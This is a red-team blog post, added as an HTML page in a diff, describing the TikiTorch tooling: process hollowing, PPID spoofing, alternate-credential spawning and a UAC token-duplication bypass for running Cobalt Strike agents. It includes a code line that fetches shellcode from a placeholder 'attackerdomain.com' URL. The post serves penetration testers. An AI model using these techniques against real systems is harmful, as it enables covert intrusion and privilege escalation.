@@ -1,0 +1,878 @@
+
+
+  
+    
+  
+
+
+  
+
+
+
+
+  
+
+
+  
+
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hugo 0.53">
+    <meta name="theme" content="Tranquilpeak 0.3.1-BETA">
+    <title>TikiTorch</title>
+    <meta name="author" content="Rasta Mouse">
+    <meta name="keywords" content="">
+
+    <link rel="icon" href="https://rastamouse.me/favicon.ico">
+    
+
+    
+    <meta name="description" content="When TikiTorch was first released in February, it consisted of a single .NET assembly.  Almost exactly a month later, I commited an updated that increased that to four assemblies.
+
+This blog post will cover what these assemblies are and how to use them.">
+    <meta property="og:description" content="When TikiTorch was first released in February, it consisted of a single .NET assembly.  Almost exactly a month later, I commited an updated that increased that to four assemblies.
+
+This blog post will cover what these assemblies are and how to use them.">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="TikiTorch">
+    <meta property="og:url" content="/2019/03/tikitorch/">
+    <meta property="og:site_name" content="Rasta Mouse">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Rasta Mouse">
+    <meta name="twitter:description" content="When TikiTorch was first released in February, it consisted of a single .NET assembly.  Almost exactly a month later, I commited an updated that increased that to four assemblies.
+
+This blog post will cover what these assemblies are and how to use them.">
+    
+      <meta name="twitter:creator" content="@_RastaMouse">
+    
+    
+
+    
+    
+
+    
+      <meta property="og:image" content="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=640">
+    
+
+    
+      <meta property="og:image" content="https://rastamouse.me/images/tikitorch/thumb.png">
+    
+    
+    
+
+    
+
+    
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.css" />
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" />
+    
+    
+    <link rel="stylesheet" href="https://rastamouse.me/css/style-u6mk0ojoywresbx8iepslrmmhl4stuhrsxuwhkpwrkrx7mryjcaimasnk4pi.min.css" />
+    
+    
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-60712346-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="4"> 
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://rastamouse.me/">Rasta Mouse</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://rastamouse.me/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=90" alt="Author&#39;s picture" />
+      
+    
+    </a>
+  
+</header>
+      <nav id="sidebar" data-behavior="4">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://rastamouse.me/#about">
+          <img class="sidebar-profile-picture" src="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=110" alt="Author&#39;s picture" />
+        </a>
+        <h4 class="sidebar-profile-name">Rasta Mouse</h4>
+        
+          <h5 class="sidebar-profile-bio">Taylor Swift fan, wannabe Red Teamer &amp; 1337 hax0r (in that order).</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://rastamouse.me/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://rastamouse.me/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://rastamouse.me/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Archives</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://rastamouse.me/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://rastamouse.me/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://twitter.com/_RastaMouse" target="_blank">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
+      
+      <span class="sidebar-button-desc">Twitter</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://keybase.io/rasta_mouse" target="_blank">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-lock"></i>
+      
+      <span class="sidebar-button-desc">Keybase</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://zeropointsecurity.co.uk/rastalabs/" target="_blank">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-shield"></i>
+      
+      <span class="sidebar-button-desc">RastaLabs</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/rasta-mouse" target="_blank">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://rastamouse.me/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="4"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title" itemprop="headline">
+      TikiTorch
+    </h1>
+  
+  <div class="postShorten-meta post-meta">
+  
+    <time itemprop="datePublished" datetime="2019-03-20T00:00:00Z">
+      
+  
+  
+  
+  
+    20 March 2019
+  
+
+    </time>
+  
+  
+  
+  
+    <span>in</span>
+    
+      <a class="category-link" href="https://rastamouse.me/categories/blog">blog</a>
+    
+  
+
+
+</div>
+
+</div>
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <p>When TikiTorch was <a href="https://github.com/rasta-mouse/TikiTorch/tree/882cbd1d74e9ddcfb3409f6d5a200f03beb79e7a">first released</a> in February, it consisted of a single .NET assembly.  Almost exactly a month later, I <a href="https://github.com/rasta-mouse/TikiTorch/tree/3116ad0cbb4343bcc720f1e850b08d938971cd9c">commited</a> an updated that increased that to four assemblies.</p>
+
+<p>This blog post will cover what these assemblies are and how to use them.</p>
+
+<p>As the <a href="https://github.com/rasta-mouse/TikiTorch/blob/master/README.md">README</a> explains briefly, the four assemblies are:</p>
+
+<ul>
+<li>TikiLoader</li>
+<li>TikiSpawn</li>
+<li>TikiSpawnAs</li>
+<li>TikiSpawnAsAdmin</li>
+</ul>
+
+<h4 id="tikiloader">TikiLoader</h4>
+
+<p>This is a class library that contains the process hollowing code that  <code>TikiSpawn</code>, <code>TikiSpawnAs</code> and <code>TikiSpawnAsAdmin</code> use as a reference.  The obvious advantage for doing that, is that we don&rsquo;t have to duplicate the same code across the three projects.  The downside is that we need to compile them with something like <code>Costura.Fody</code> to have a single executable that we can use with Cobalt Strike&rsquo;s <code>execute-assembly</code> function.</p>
+
+<p>As a user, you don&rsquo;t need to touch <code>TikiLoader</code> unless you want to change the core process creation and hollowing functionality.</p>
+
+<h4 id="tikispawn">TikiSpawn</h4>
+
+<p>TikiSpawn is essentially what the original &ldquo;TikiTorch&rdquo; project was - a class library that could be compiled to a DLL and delivered to bootstrap an agent on a host.  It was designed as a DLL so that it was compatible with (DotNetToJScript)[<a href="https://github.com/tyranid/DotNetToJScript">https://github.com/tyranid/DotNetToJScript</a>], allowing you to run payloads via a variety of <a href="https://lolbas-project.github.io/">LOLBINS</a>.</p>
+
+<p>The easiest way to get started with <code>TikiSpawn</code> is to add your inputs to the constructor.</p>
+
+<pre><code class="language-C#">public TikiSpawn()
+{
+    Flame(@&quot;&quot;, @&quot;&quot;);
+}
+</code></pre>
+
+<p>The first argument should be the <strong>binary</strong> you want to create, the second should be a <strong>URL</strong> where your base64 encoded shellcode lives.  <code>TikiSpawn</code> will download the shellcode over HTTP using a proxy-aware WebClient class, but you could change this to download over any protocol you like.  You could also add additional functionality to deal with encrypted or compressed shellcode.</p>
+
+<p>You should have something like:</p>
+
+<pre><code class="language-C#">public TikiSpawn()
+{
+    Flame(@&quot;C:\\Program Files\\Internet Explorer\\iexplore.exe&quot;, @&quot;https://attackerdomain.com/evilshellcode.txt&quot;);
+}
+</code></pre>
+
+<p><code>TikiSpawn</code> can also spoof the PPID of your target binary, using <code>lpAttributeList</code>.  In the <code>Flame</code> function, there is the line:</p>
+
+<pre><code class="language-C#">int ppid = FindProcessPid(&quot;explorer&quot;);
+</code></pre>
+
+<p>Since I&rsquo;m spawning Internet Explorer, setting Explorer as my PID seems logical.  But you can change this to suit whatever binary you choose to use.</p>
+
+<p>Once compiled, you will have <code>TikiSpawn.dll</code>.</p>
+
+<p>After delivery, we can confirm that our agent is indeed running inside Internet Explorer and that it&rsquo;s PPID&rsquo;d to Explorer.</p>
+
+<figure>
+    <img src="https://rastamouse.me/images/tikitorch/tikispawn.png"/> 
+</figure>
+
+
+<p>TikiLoader will also use <code>RW</code> and <code>RX</code> memory regions, rather than <code>RWX</code>.</p>
+
+<figure>
+    <img src="https://rastamouse.me/images/tikitorch/tikispawn_rx.png"/> 
+</figure>
+
+
+<h4 id="tikispawnas">TikiSpawnAs</h4>
+
+<p>This is the equivilent to <code>spawnas</code> and allows you to run an agent with alternate creds.  It&rsquo;s designed to be run via Cobalt Strike&rsquo;s <code>execute-assebmly</code>, although you could also drop it to disk.  The current implementation requires that the shellcode be hardcoded into the binary.</p>
+
+<pre><code class="language-C#">byte[] shellcode = Convert.FromBase64String(@&quot;&quot;);
+</code></pre>
+
+<figure>
+    <img src="https://rastamouse.me/images/tikitorch/tikispawnas.png"/> 
+</figure>
+
+
+<p>Note that the process spawned via TikiSpawnAs has no PPID.</p>
+
+<figure>
+    <img src="https://rastamouse.me/images/tikitorch/tikispawnas_ph.png"/> 
+</figure>
+
+
+<h4 id="tikispawnasadmin">TikiSpawnAsAdmin</h4>
+
+<p>This uses the Token Duplication UAC bypass to spawn an agent (as the current user) in high integrity, akin to Cobalt Strike&rsquo;s <code>elevate uac-token-duplication</code> command.  For configurations where &ldquo;Always Notify&rdquo; is enabled, you can supply the existing PID of a high integrity process; otherwise it will spawn <code>wusa.exe</code> and impersonate its token.</p>
+
+<figure>
+    <img src="https://rastamouse.me/images/tikitorch/tikispawnasadmin.png"/> 
+</figure>
+
+
+<p>As with TikiSpawnAs, the spawned process will have no PPID.</p>
+
+<figure>
+    <img src="https://rastamouse.me/images/tikitorch/tikispawnasadmin_ph.png"/> 
+</figure>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">TAGGED IN</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/payloads/">Payloads</a>
+
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/process-hollowing/">Process Hollowing</a>
+
+  <a class="tag tag--primary tag--small" href="https://rastamouse.me/tags/tikitorch/">TikiTorch</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  <nav>
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+            <i class="fa fa-angle-left"></i>
+            <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+          </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2019/01/gpo-abuse-part-2/" data-tooltip="GPO Abuse - Part 2">
+          
+            <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+            <i class="fa fa-angle-right"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </nav>
+  <ul class="post-actions post-action-share">
+    
+      <li class="post-action hide-lg hide-md hide-sm">
+        <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+          <i class="fa fa-share-alt"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2019%2f03%2ftikitorch%2f">
+          <i class="fa fa-google-plus"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2019%2f03%2ftikitorch%2f">
+          <i class="fa fa-facebook-official"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2019%2f03%2ftikitorch%2f">
+          <i class="fa fa-twitter"></i>
+        </a>
+      </li>
+    
+    
+      <li class="post-action">
+        <a class="post-action-btn btn btn--default" href="#disqus_thread">
+          <i class="fa fa-comment-o"></i>
+        </a>
+      </li>
+    
+    <li class="post-action">
+      
+        <a class="post-action-btn btn btn--default" href="#">
+      
+        <i class="fa fa-list"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2019 Rasta Mouse. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        <div class="post-actions-wrap">
+  <nav>
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+            <i class="fa fa-angle-left"></i>
+            <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
+          </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://rastamouse.me/2019/01/gpo-abuse-part-2/" data-tooltip="GPO Abuse - Part 2">
+          
+            <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
+            <i class="fa fa-angle-right"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </nav>
+  <ul class="post-actions post-action-share">
+    
+      <li class="post-action hide-lg hide-md hide-sm">
+        <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+          <i class="fa fa-share-alt"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2019%2f03%2ftikitorch%2f">
+          <i class="fa fa-google-plus"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2019%2f03%2ftikitorch%2f">
+          <i class="fa fa-facebook-official"></i>
+        </a>
+      </li>
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2019%2f03%2ftikitorch%2f">
+          <i class="fa fa-twitter"></i>
+        </a>
+      </li>
+    
+    
+      <li class="post-action">
+        <a class="post-action-btn btn btn--default" href="#disqus_thread">
+          <i class="fa fa-comment-o"></i>
+        </a>
+      </li>
+    
+    <li class="post-action">
+      
+        <a class="post-action-btn btn btn--default" href="#">
+      
+        <i class="fa fa-list"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <ul class="share-options">
+    <li class="share-option">
+      <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3a%2f%2frastamouse.me%2f2019%2f03%2ftikitorch%2f">
+        <i class="fa fa-google-plus"></i><span>Share on Google Plus</span>
+      </a>
+    </li>
+    <li class="share-option">
+      <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2frastamouse.me%2f2019%2f03%2ftikitorch%2f">
+        <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
+      </a>
+    </li>
+    <li class="share-option">
+      <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3a%2f%2frastamouse.me%2f2019%2f03%2ftikitorch%2f">
+        <i class="fa fa-twitter"></i><span>Share on Twitter</span>
+      </a>
+    </li>
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="//www.gravatar.com/avatar/2b44f5ca5458931c49e1fa57da6705c1?s=110" alt="Author&#39;s picture" />
+    
+    <h4 id="about-card-name">Rasta Mouse</h4>
+    
+      <div id="about-card-bio">Taylor Swift fan, wannabe Red Teamer &amp; 1337 hax0r (in that order).</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Penetration Tester
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        UK
+      </div>
+    
+  </div>
+</div>
+
+    <div id="algolia-search-modal" class="modal-container">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="close-button"><i class="fa fa-close"></i></span>
+      <a href="https://algolia.com" target="_blank" class="searchby-algolia text-color-light link-unstyled">
+        <span class="searchby-algolia-text text-color-light text-small">by</span>
+        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+      </a>
+      <i class="search-icon fa fa-search"></i>
+      <form id="algolia-search-form">
+        <input type="text" id="algolia-search-input" name="search"
+          class="form-control input--large search-input" placeholder="Search" />
+      </form>
+    </div>
+    <div class="modal-body">
+      <div class="no-result text-color-light text-center">no post found</div>
+      <div class="results">
+        
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2019/03/tikitorch/">
+                <h3 class="media-heading">TikiTorch</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Mar 3, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>When TikiTorch was <a href="https://github.com/rasta-mouse/TikiTorch/tree/882cbd1d74e9ddcfb3409f6d5a200f03beb79e7a">first released</a> in February, it consisted of a single .NET assembly.  Almost exactly a month later, I <a href="https://github.com/rasta-mouse/TikiTorch/tree/3116ad0cbb4343bcc720f1e850b08d938971cd9c">commited</a> an updated that increased that to four assemblies.</p>
+
+<p>This blog post will cover what these assemblies are and how to use them.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2019/01/gpo-abuse-part-2/">
+                <h3 class="media-heading">GPO Abuse - Part 2</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Jan 1, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>Before we can really dive into modifying GPOs, we need to try and understand some of the intricacies of how they&rsquo;re updated normally in GPMC and AD.  Because believe me, it aint as simple as it appears.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2019/01/gpo-abuse-part-1/">
+                <h3 class="media-heading">GPO Abuse - Part 1</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Jan 1, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>Group Policy Objects (GPOs) is a subject I&rsquo;ve wanted to write about for a long time and I&rsquo;m happy to have <em>finally</em> started.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/">
+                <h3 class="media-heading">AmsiScanBuffer Bypass - Part 4</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>As 2018 rapidly comes to an end, I thought I&rsquo;d close out the year by clearing up some confusions over this AmsiScanBuffer bypass and why it appears to fail under some circumstances.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/">
+                <h3 class="media-heading">AmsiScanBuffer Bypass - Part 3</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Nov 11, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>In <a href="https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-2/">Part 2</a>, we engineered a delivery method for the AmsiScanBuffer Bypass discussed in <a href="https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-1/">Part 1</a>.  In this post, we&rsquo;ll make some modifications to the bypass itself.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-2/">
+                <h3 class="media-heading">AmsiScanBuffer Bypass - Part 2</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>In <a href="https://rastamouse.me/2018/10/amsiscanbuffer-bypass---part-1/">Part 1</a>, we had a brief look at the AmsiScanBuffer bypass technique.  We found some circumstances where the bypass code would be identified as malicious before it could be executed (which turned out to be a simple string detection), and modified the code to circumvent this.</p>
+
+<p>In this post, we&rsquo;ll explore a delivery method to help stage a Cobalt Strike / Empire / &lt;insert framework here&gt; agent.  As with Part 1, this is not about some 1337 code drop - it&rsquo;s a demonstration of how I walked through engineering the final result.</p>
+
+<p>So, let&rsquo;s get cracking.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/10/amsiscanbuffer-bypass-part-1/">
+                <h3 class="media-heading">AmsiScanBuffer Bypass - Part 1</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p><a href="https://twitter.com/_zc00l">Andre Marques</a> recently <a href="https://twitter.com/_zc00l/status/1056523259246718976">posted</a> a pretty nice <a href="https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html">write-up</a> for circumventing AMSI, based on previous work by <a href="https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/">CyberArk</a>.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/">
+                <h3 class="media-heading">A Lesson in .NET Framework Versions</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Sep 9, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>With the emergence of more C# and .NET tooling, I occasionally see people tripping up over this.  It&rsquo;s not a huge issue, just something to be aware of.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/09/enumerating-applocker-config/">
+                <h3 class="media-heading">Enumerating AppLocker Config</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Sep 9, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>Very quick post to explore some different ways to enumerate the AppLocker configuration being applied to a host, both remotely and locally.  Understanding these rules, particularly deny rules, are useful for engineering bypasses.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://rastamouse.me/2018/06/rdpclip/">
+                <h3 class="media-heading">RDPClip</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Jun 6, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>This is just a quick post to demonstrate some interesting aspects of the Remote Desktop Clipboard Monitor.</p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+      </div>
+    </div>
+    <div class="modal-footer">
+      <p class="results-count text-medium"
+         data-message-zero="no post found"
+         data-message-one="1 post found"
+         data-message-other="{n} posts found">
+         25 posts found
+      </p>
+    </div>
+  </div>
+</div>
+    
+  
+    
+    <div id="cover" style="background-image:url('https://rastamouse.me/images/cover.jpg');"></div>
+  
+
+
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.js"></script>
+
+
+<script src="https://rastamouse.me/js/script-wl33z0n6ocaypepiqrazthtivfrliqijej4rq8ek8gvrv1awftmgjuv8k4zc.min.js"></script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight').each(function(i, block) {
+    var code = "";
+    hljs.highlightAuto(block.innerText).value.split(/\r\n|\r|\n/).forEach(function(line) {
+      code += "<span class=\"line\">" + line + "</span><br>";
+    });
+    if (code.length > 0) {
+      block.innerHTML = code;  
+    }
+  });
+  $('pre > code').each(function(i, block) {
+    $(this).addClass('codeblock');
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/rastamouse.me\/2019\/03\/tikitorch\/';
+          
+            this.page.identifier = '\/2019\/03\/tikitorch\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'rastamouse';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+
+    
+  </body>
+</html>
+
